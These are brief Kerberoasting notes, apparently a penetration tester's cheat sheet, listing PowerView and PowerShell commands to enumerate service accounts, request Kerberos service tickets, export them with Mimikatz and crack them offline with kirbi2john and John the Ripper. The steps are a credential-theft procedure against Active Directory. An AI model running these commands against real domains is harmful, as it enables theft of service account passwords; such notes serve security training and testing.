#Kerberoast

1. Get-NetUser -SPN

Pick your target

2. Request a TGS

`Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN NAME>"`


OR

`Request-SPNTicket` from PowerView for cracking with John or Hashcat

Now we run Mimikatz to drop the generated .kirbi tickets for offline cracking!

use kirbi2john.py and then jtr to crack!
